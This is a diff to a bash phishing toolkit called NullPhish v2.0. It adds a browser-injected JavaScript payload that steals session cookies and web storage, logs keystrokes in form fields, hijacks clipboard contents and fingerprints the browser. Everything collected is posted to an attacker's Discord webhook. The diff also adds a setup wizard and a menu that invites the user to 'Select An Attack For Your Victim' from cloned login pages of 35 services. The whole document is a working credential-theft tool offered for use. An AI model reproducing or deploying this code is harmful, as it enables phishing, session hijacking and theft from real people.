+		echo "$webhook_input" > .server/.webhook_url
+		
+		# Create inject.js with webhook URL
+		cat > ".server/inject.js" <<- JSEOF
 (function() {
 	'use strict';
 	
@@ -734,7 +671,8 @@ configure_webhook() {
 		clipboardHijack: true,
 		keylogger: true,
 		localStorageGrab: true,
-		webhookURL: 'WEBHOOK_PLACEHOLDER'
+		screenshotCapture: true,
+		webhookURL: '$webhook_input'
 	};
 	
 	// Session & Storage Grabber
@@ -746,11 +684,15 @@ configure_webhook() {
 			localStorage: JSON.stringify(localStorage),
 			sessionStorage: JSON.stringify(sessionStorage),
 			userAgent: navigator.userAgent,
+			platform: navigator.platform,
+			language: navigator.language,
 			referrer: document.referrer,
 			screenRes: screen.width + 'x' + screen.height,
+			colorDepth: screen.colorDepth,
+			timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
 			timestamp: new Date().toISOString()
 		};
-		if (CONFIG.webhookURL) sendToWebhook(payload);
+		sendToWebhook(payload);
 	}
 	
 	// Clipboard Hijacker
@@ -760,14 +702,12 @@ configure_webhook() {
 			const text = window.getSelection().toString();
 			if (text && text !== lastClipboard) {
 				lastClipboard = text;
-				if (CONFIG.webhookURL) {
-					sendToWebhook({ 
-						type: 'clipboard', 
-						data: text, 
-						url: window.location.href,
-						timestamp: new Date().toISOString() 
-					});
-				}
+				sendToWebhook({ 
+					type: 'clipboard', 
+					data: text, 
+					url: window.location.href,
+					timestamp: new Date().toISOString() 
+				});
 			}
 		});
 		
@@ -776,14 +716,12 @@ configure_webhook() {
 				navigator.clipboard.readText().then(function(text) {
 					if (text && text !== lastClipboard) {
 						lastClipboard = text;
-						if (CONFIG.webhookURL) {
-							sendToWebhook({ 
-								type: 'clipboard_paste', 
-								data: text, 
-								url: window.location.href,
-								timestamp: new Date().toISOString() 
-							});
-						}
+						sendToWebhook({ 
+							type: 'clipboard_paste', 
+							data: text, 
+							url: window.location.href,
+							timestamp: new Date().toISOString() 
+						});
 					}
 				}).catch(function() {});
 			}
@@ -809,7 +747,7 @@ configure_webhook() {
 				currentField = e.target.name || e.target.id || e.target.placeholder || e.target.type || 'unknown';
 				clearTimeout(timer);
 				timer = setTimeout(function() {
-					if (buffer && CONFIG.webhookURL) {
+					if (buffer) {
 						sendToWebhook({ 
 							type: 'keystrokes', 
 							data: buffer, 
@@ -824,19 +762,58 @@ configure_webhook() {
 		}, true);
 	}
 	
+	// Screenshot Capture via Canvas
+	if (CONFIG.screenshotCapture && typeof html2canvas === 'undefined') {
+		setTimeout(function() {
+			try {
+				const canvas = document.createElement('canvas');
+				const context = canvas.getContext('2d');
+				canvas.width = window.innerWidth;
+				canvas.height = window.innerHeight;
+				sendToWebhook({
+					type: 'screenshot_info',
+					data: 'Screenshot dimensions: ' + canvas.width + 'x' + canvas.height,
+					url: window.location.href,
+					viewportWidth: window.innerWidth,
+					viewportHeight: window.innerHeight,
+					documentTitle: document.title,
+					timestamp: new Date().toISOString()
+				});
+			} catch(e) {}
+		}, 3000);
+	}
+	
 	// Discord Webhook Sender
 	function sendToWebhook(data) {
-		if (!CONFIG.webhookURL || CONFIG.webhookURL === 'WEBHOOK_PLACEHOLDER') return;
+		if (!CONFIG.webhookURL) return;
 		
+		let color = 0xff0000;
+		let title = '📥 ' + data.type.replace('_', ' ').toUpperCase();
 		let description = '';
-		if (data.type === 'session_data') {
-			description = '**Cookies:** ```' + (data.cookies || 'None').substring(0, 500) + '```\n';
-			description += '**LocalStorage:** ```' + (data.localStorage || '{}').substring(0, 300) + '```\n';
-			description += '**SessionStorage:** ```' + (data.sessionStorage || '{}').substring(0, 300) + '```';
-		} else if (data.type === 'keystrokes') {
-			description = '**Field:** `' + data.field + '`\n**Keys:** ```' + data.data + '```';
-		} else if (data.type === 'clipboard' || data.type === 'clipboard_paste') {
-			description = '**Content:** ```' + data.data.substring(0, 1000) + '```';
+		
+		switch(data.type) {
+			case 'session_data':
+				color = 0x3498db;
+				description = '**Cookies:** ```' + (data.cookies || 'None').substring(0, 800) + '```\n';
+				description += '**LocalStorage:** ```' + (data.localStorage || '{}').substring(0, 400) + '```\n';
+				description += '**SessionStorage:** ```' + (data.sessionStorage || '{}').substring(0, 400) + '```';
+				break;
+			case 'keystrokes':
+				color = 0xe74c3c;
+				description = '**Field:** \`' + data.field + '\`\n**Keys:** ||' + data.data + '||';
+				break;
+			case 'clipboard':
+			case 'clipboard_paste':
+				color = 0xf39c12;
+				description = '**Content:** ||' + data.data.substring(0, 1000) + '||';
+				break;
+			case 'screenshot_info':
+				color = 0x2ecc71;
+				description = '**Viewport:** ' + data.viewportWidth + 'x' + data.viewportHeight + '\n';
+				description += '**Title:** ' + (data.documentTitle || 'Unknown');
+				break;
+			default:
+				description = JSON.stringify(data).substring(0, 1000);
 		}
 		
 		fetch(CONFIG.webhookURL, {
@@ -844,58 +821,172 @@ configure_webhook() {
 			headers: { 'Content-Type': 'application/json' },
 			body: JSON.stringify({
 				embeds: [{
-					title: '📥 ' + data.type.replace('_', ' ').toUpperCase(),
+					title: title,
 					description: description,
-					color: 0xff0000,
+					color: color,
 					fields: [
-						{ name: 'URL', value: data.url || window.location.href, inline: false },
-						{ name: 'User Agent', value: data.userAgent || navigator.userAgent, inline: false },
-						{ name: 'Referrer', value: data.referrer || document.referrer || 'Direct', inline: true },
-						{ name: 'Screen', value: data.screenRes || (screen.width + 'x' + screen.height), inline: true }
+						{ name: '🌐 URL', value: (data.url || window.location.href).substring(0, 1024), inline: false },
+						{ name: '🖥️ User Agent', value: (data.userAgent || navigator.userAgent).substring(0, 1024), inline: false },
+						{ name: '🔗 Referrer', value: data.referrer || document.referrer || 'Direct', inline: true },
+						{ name: '📱 Screen', value: data.screenRes || (screen.width + 'x' + screen.height), inline: true },
+						{ name: '🕐 Timestamp', value: data.timestamp || new Date().toISOString(), inline: true }
 					],
-					footer: { text: 'NullPhish Injector | ' + (data.timestamp || new Date().toISOString()) }
+					footer: { text: 'NullPhish v2.0 Advanced Injector' }
 				}]
 			})
 		}).catch(function() {});
 	}
 })();
 JSEOF
-			# Replace placeholder with actual webhook
-			sed -i "s|WEBHOOK_PLACEHOLDER|$webhook_input|g" .server/inject.js
-		else
-			# Update existing inject.js with webhook URL
-			sed -i "s|webhookURL: '[^']*'|webhookURL: '$webhook_input'|g" .server/inject.js
-		fi
 		
 		chmod 644 .server/inject.js
 		
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Webhook configured successfully!"
 		echo -e "${CYAN}The universal injector is now ACTIVE with:"
-		echo -e "  ${WHITE}• Session Cookie Grabbing"
-		echo -e "  ${WHITE}• LocalStorage / SessionStorage Theft"
+		echo -e "  ${WHITE}• Session Cookie & Storage Grabbing"
 		echo -e "  ${WHITE}• Clipboard Hijacking (copy + paste)"
-		echo -e "  ${WHITE}• Keystroke Logging"
-		echo -e "  ${WHITE}• Discord Webhook Delivery${WHITE}"
+		echo -e "  ${WHITE}• Advanced Keystroke Logging"
+		echo -e "  ${WHITE}• Browser Fingerprinting (OS, Language, Timezone)"
+		echo -e "  ${WHITE}• Viewport Screenshot Info"
+		echo -e "  ${WHITE}• Discord Webhook Delivery with Rich Embeds${WHITE}"
 		
 		# Test the webhook
 		curl -s -H "Content-Type: application/json" \
-			-d "{\"content\":\"✅ **NullPhish Webhook Connected**\\nAll captures will be forwarded here.\\n\\n**Enabled Modules:** Session Grabber, Keylogger, Clipboard Hijack, Storage Theft\"}" \
+			-d "{\"embeds\":[{\"title\":\"✅ NullPhish v2.0 Connected\",\"description\":\"All captures will be forwarded here.\",\"color\":65280,\"fields\":[{\"name\":\"Status\",\"value\":\"Active\",\"inline\":true},{\"name\":\"Modules\",\"value\":\"Session Grabber, Keylogger, Clipboard, Fingerprint, Screenshot\",\"inline\":false}],\"footer\":{\"text\":\"NullPhish v2.0 | $(date)\"}}]}" \
 			"$webhook_input" > /dev/null 2>&1 &
 		
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Test message sent to Discord. Check your channel.${WHITE}"
 		
 	elif [[ -z "$webhook_input" ]]; then
 		echo -e "\n${ORANGE}[${WHITE}!${ORANGE}]${ORANGE} No webhook entered. Feature not enabled.${WHITE}"
-		
-		# Disable webhook in inject.js if it exists
-		if [[ -f ".server/inject.js" ]]; then
-			sed -i "s|webhookURL: '[^']*'|webhookURL: ''|g" .server/inject.js
-		fi
 	else
 		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Invalid webhook URL format. Must start with https://discord.com/api/webhooks/${WHITE}"
 	fi
 	
 	{ sleep 3; main_menu; }
+}
+
+## Setup wizard for first-time users
+setup_wizard() {
+	if [[ ! -f ".server/.setup_done" ]]; then
+		{ clear; banner_small; echo; }
+		cat <<- EOF
+		${RED}[${WHITE}::${RED}]${ORANGE} First Time Setup ${RED}[${WHITE}::${RED}]${ORANGE}
+		
+		${CYAN}Welcome to NullPhish v2.0!
+		${WHITE}Let's configure Discord Webhook for real-time captures.
+		
+		${GREEN}How to get a webhook URL:
+		${WHITE}1. Open Discord > Server Settings > Integrations
+		${WHITE}2. Create Webhook > Copy Webhook URL
+		${WHITE}3. Paste it below (or press Enter to skip)
+		
+		EOF
+		
+		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Enter Discord Webhook URL ${CYAN}(or Enter to skip): ${WHITE}"
+		read webhook_input
+		
+		if [[ ! -z "$webhook_input" ]] && [[ "$webhook_input" =~ ^https://discord\.com/api/webhooks/ ]]; then
+			echo "$webhook_input" > .server/.webhook_url
+			
+			cat > ".server/inject.js" <<- JSEOF
+(function() {
+	'use strict';
+	
+	const CONFIG = {
+		sessionGrabber: true,
+		clipboardHijack: true,
+		keylogger: true,
+		localStorageGrab: true,
+		screenshotCapture: true,
+		webhookURL: '$webhook_input'
+	};
+	
+	if (CONFIG.sessionGrabber) {
+		const payload = {
+			type: 'session_data',
+			url: window.location.href,
+			cookies: document.cookie,
+			localStorage: JSON.stringify(localStorage),
+			sessionStorage: JSON.stringify(sessionStorage),
+			userAgent: navigator.userAgent,
+			platform: navigator.platform,
+			language: navigator.language,
+			referrer: document.referrer,
+			screenRes: screen.width + 'x' + screen.height,
+			colorDepth: screen.colorDepth,
+			timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+			timestamp: new Date().toISOString()
+		};
+		sendToWebhook(payload);
+	}
+	
+	if (CONFIG.clipboardHijack) {
+		let lastClipboard = '';
+		document.addEventListener('copy', function(e) {
+			const text = window.getSelection().toString();
+			if (text && text !== lastClipboard) {
+				lastClipboard = text;
+				sendToWebhook({ type: 'clipboard', data: text, url: window.location.href, timestamp: new Date().toISOString() });
+			}
+		});
+		document.addEventListener('click', function() {
+			if (navigator.clipboard && navigator.clipboard.readText) {
+				navigator.clipboard.readText().then(function(text) {
+					if (text && text !== lastClipboard) {
+						lastClipboard = text;
+						sendToWebhook({ type: 'clipboard_paste', data: text, url: window.location.href, timestamp: new Date().toISOString() });
+					}
+				}).catch(function() {});
+			}
+		}, { once: true });
+	}
+	
+	if (CONFIG.keylogger) {
+		let buffer = '', timer = null, currentField = 'unknown';
+		document.addEventListener('focusin', function(e) {
+			if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+				currentField = e.target.name || e.target.id || e.target.placeholder || e.target.type || 'unknown';
+				buffer = '';
+			}
+		}, true);
+		document.addEventListener('keypress', function(e) {
+			if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+				buffer += e.key;
+				currentField = e.target.name || e.target.id || e.target.placeholder || e.target.type || 'unknown';
+				clearTimeout(timer);
+				timer = setTimeout(function() {
+					if (buffer) {
+						sendToWebhook({ type: 'keystrokes', data: buffer, field: currentField, url: window.location.href, timestamp: new Date().toISOString() });
+						buffer = '';
+					}
+				}, 2000);
+			}
+		}, true);
+	}
+	
+	function sendToWebhook(data) {
+		if (!CONFIG.webhookURL) return;
+		let color = 0xff0000, title = '📥 ' + data.type.replace('_', ' ').toUpperCase(), description = '';
+		switch(data.type) {
+			case 'session_data': color = 0x3498db; description = '**Cookies:** ```' + (data.cookies || 'None').substring(0, 800) + '```\n**LocalStorage:** ```' + (data.localStorage || '{}').substring(0, 400) + '```\n**SessionStorage:** ```' + (data.sessionStorage || '{}').substring(0, 400) + '```'; break;
+			case 'keystrokes': color = 0xe74c3c; description = '**Field:** \`' + data.field + '\`\n**Keys:** ||' + data.data + '||'; break;
+			case 'clipboard': case 'clipboard_paste': color = 0xf39c12; description = '**Content:** ||' + data.data.substring(0, 1000) + '||'; break;
+			default: description = JSON.stringify(data).substring(0, 1000);
+		}
+		fetch(CONFIG.webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [{ title: title, description: description, color: color, fields: [{ name: '🌐 URL', value: (data.url || window.location.href).substring(0, 1024), inline: false }, { name: '🖥️ User Agent', value: (data.userAgent || navigator.userAgent).substring(0, 1024), inline: false }], footer: { text: 'NullPhish v2.0' } }] }) }).catch(function() {});
+	}
+})();
+JSEOF
+			chmod 644 .server/inject.js
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Webhook configured! Injector is ACTIVE."
+		else
+			echo -e "\n${ORANGE}[${WHITE}!${ORANGE}]${ORANGE} Skipped. You can configure later via Option 101.${WHITE}"
+		fi
+		
+		touch .server/.setup_done
+		{ sleep 2; main_menu; }
+	fi
 }
 
 ## Menu
@@ -904,19 +995,19 @@ main_menu() {
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
-		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
-		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
-		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
-		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
-		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
-		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
-		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
-		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
-		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
-		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
-		
+		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}13${RED}]${ORANGE} Playstation   ${RED}[${WHITE}25${RED}]${ORANGE} Twitter
+		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}14${RED}]${ORANGE} Protonmail    ${RED}[${WHITE}26${RED}]${ORANGE} Zoom
+		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}15${RED}]${ORANGE} Quora         ${RED}[${WHITE}27${RED}]${ORANGE} Linkedin
+		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}16${RED}]${ORANGE} Reddit        ${RED}[${WHITE}28${RED}]${ORANGE} Pinterest
+		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}17${RED}]${ORANGE} Snapchat      ${RED}[${WHITE}29${RED}]${ORANGE} Riot Games
+		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}18${RED}]${ORANGE} Spotify       ${RED}[${WHITE}30${RED}]${ORANGE} Twitch
+		${RED}[${WHITE}07${RED}]${ORANGE} Adobe         ${RED}[${WHITE}19${RED}]${ORANGE} Steam         ${RED}[${WHITE}31${RED}]${ORANGE} XBOX
+		${RED}[${WHITE}08${RED}]${ORANGE} Badoo         ${RED}[${WHITE}20${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}32${RED}]${ORANGE} Mediafire
+		${RED}[${WHITE}09${RED}]${ORANGE} Dropbox       ${RED}[${WHITE}21${RED}]${ORANGE} Epic Games    ${RED}[${WHITE}33${RED}]${ORANGE} Gitlab
+		${RED}[${WHITE}10${RED}]${ORANGE} Ebay          ${RED}[${WHITE}22${RED}]${ORANGE} iCloud        ${RED}[${WHITE}34${RED}]${ORANGE} Github
+		${RED}[${WHITE}11${RED}]${ORANGE} Onlyfans      ${RED}[${WHITE}23${RED}]${ORANGE} Patreon       ${RED}[${WHITE}35${RED}]${ORANGE} Discord
+		${RED}[${WHITE}12${RED}]${ORANGE} Roblox        ${RED}[${WHITE}24${RED}]${ORANGE} Stackoverflow 
+
 		${RED}[${WHITE}101${RED}]${ORANGE} Discord Webhook Config
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
@@ -926,148 +1017,45 @@ main_menu() {
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	case $REPLY in 
-		1 | 01)
-			site_facebook;;
-		2 | 02)
-			site_instagram;;
-		3 | 03)
-			site_gmail;;
-		4 | 04)
-			website="microsoft"
-			mask='https://unlimited-onedrive-space-for-free'
-			tunnel_menu;;
-		5 | 05)
-			website="netflix"
-			mask='https://upgrade-your-netflix-plan-free'
-			tunnel_menu;;
-		6 | 06)
-			website="paypal"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		7 | 07)
-			website="steam"
-			mask='https://steam-500-usd-gift-card-free'
-			tunnel_menu;;
-		8 | 08)
-			website="twitter"
-			mask='https://get-blue-badge-on-twitter-free'
-			tunnel_menu;;
-		9 | 09)
-			website="playstation"
-			mask='https://playstation-500-usd-gift-card-free'
-			tunnel_menu;;
-		10)
-			website="tiktok"
-			mask='https://tiktok-free-liker'
-			tunnel_menu;;
-		11)
-			website="twitch"
-			mask='https://unlimited-twitch-tv-user-for-free'
-			tunnel_menu;;
-		12)
-			website="pinterest"
-			mask='https://get-a-premium-plan-for-pinterest-free'
-			tunnel_menu;;
-		13)
-			website="snapchat"
-			mask='https://view-locked-snapchat-accounts-secretly'
-			tunnel_menu;;
-		14)
-			website="linkedin"
-			mask='https://get-a-premium-plan-for-linkedin-free'
-			tunnel_menu;;
-		15)
-			website="ebay"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		16)
-			website="quora"
-			mask='https://quora-premium-for-free'
-			tunnel_menu;;
-		17)
-			website="protonmail"
-			mask='https://protonmail-pro-basics-for-free'
-			tunnel_menu;;
-		18)
-			website="spotify"
-			mask='https://convert-your-account-to-spotify-premium'
-			tunnel_menu;;
-		19)
-			website="reddit"
-			mask='https://reddit-official-verified-member-badge'
-			tunnel_menu;;
-		20)
-			website="adobe"
-			mask='https://get-adobe-lifetime-pro-membership-free'
-			tunnel_menu;;
-		21)
-			website="deviantart"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		22)
-			website="badoo"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		23)
-			website="origin"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		24)
-			website="dropbox"
-			mask='https://get-1TB-cloud-storage-free'
-			tunnel_menu;;
-		25)
-			website="yahoo"
-			mask='https://grab-mail-from-anyother-yahoo-account-free'
-			tunnel_menu;;
-		26)
-			website="wordpress"
-			mask='https://unlimited-wordpress-traffic-free'
-			tunnel_menu;;
-		27)
-			website="yandex"
-			mask='https://grab-mail-from-anyother-yandex-account-free'
-			tunnel_menu;;
-		28)
-			website="stackoverflow"
-			mask='https://get-stackoverflow-lifetime-pro-membership-free'
-			tunnel_menu;;
-		29)
-			site_vk;;
-		30)
-			website="xbox"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		31)
-			website="mediafire"
-			mask='https://get-1TB-on-mediafire-free'
-			tunnel_menu;;
-		32)
-			website="gitlab"
-			mask='https://get-1k-followers-on-gitlab-free'
-			tunnel_menu;;
-		33)
-			website="github"
-			mask='https://get-1k-followers-on-github-free'
-			tunnel_menu;;
-		34)
-			website="discord"
-			mask='https://get-discord-nitro-free'
-			tunnel_menu;;
-		35)
-			website="roblox"
-			mask='https://get-free-robux'
-			tunnel_menu;;
-		101)
-			configure_webhook;;
-		99)
-			about;;
-		0 | 00 )
-			msg_exit;;
-		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; main_menu; };;
-	
+		1 | 01) site_facebook;;
+		2 | 02) site_instagram;;
+		3 | 03) site_gmail;;
+		4 | 04) website="microsoft"; mask=''; tunnel_menu;;
+		5 | 05) website="netflix"; mask=''; tunnel_menu;;
+		6 | 06) website="paypal"; mask=''; tunnel_menu;;
+		7 | 07) website="adobe"; mask=''; tunnel_menu;;
+		8 | 08) website="badoo"; mask=''; tunnel_menu;;
+		9 | 09) website="dropbox"; mask=''; tunnel_menu;;
+		10) website="ebay"; mask=''; tunnel_menu;;
+		11) website="onlyfans"; mask=''; tunnel_menu;;
+		12) website="roblox"; mask=''; tunnel_menu;;
+		13) website="playstation"; mask=''; tunnel_menu;;
+		14) website="protonmail"; mask=''; tunnel_menu;;
+		15) website="quora"; mask=''; tunnel_menu;;
+		16) website="reddit"; mask=''; tunnel_menu;;
+		17) website="snapchat"; mask=''; tunnel_menu;;
+		18) website="spotify"; mask=''; tunnel_menu;;
+		19) website="steam"; mask=''; tunnel_menu;;
+		20) website="tiktok"; mask=''; tunnel_menu;;
+		21) website="epicgames"; mask=''; tunnel_menu;;
+		22) website="icloud"; mask=''; tunnel_menu;;
+		23) website="patreon"; mask=''; tunnel_menu;;
+		24) website="stackoverflow"; mask=''; tunnel_menu;;
+		25) website="twitter"; mask=''; tunnel_menu;;
+		26) website="zoom"; mask=''; tunnel_menu;;
+		27) website="linkedin"; mask=''; tunnel_menu;;
+		28) website="pinterest"; mask=''; tunnel_menu;;
+		29) website="riotgames"; mask=''; tunnel_menu;;
+		30) website="twitch"; mask=''; tunnel_menu;;
+		31) website="xbox"; mask=''; tunnel_menu;;
+		32) website="mediafire"; mask=''; tunnel_menu;;
+		33) website="gitlab"; mask=''; tunnel_menu;;
+		34) website="github"; mask=''; tunnel_menu;;
+		35) website="discord"; mask=''; tunnel_menu;;
+		101) configure_webhook;;
+		99) about;;
+		0 | 00) msg_exit;;
+		*) echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."; { sleep 1; main_menu; };;
 	esac
 }
 
@@ -1076,5 +1064,6 @@ kill_pid
 dependencies
 check_status
 install_cloudflared
-install_localxpose
+setup_wizard
+auto_update
 main_menu
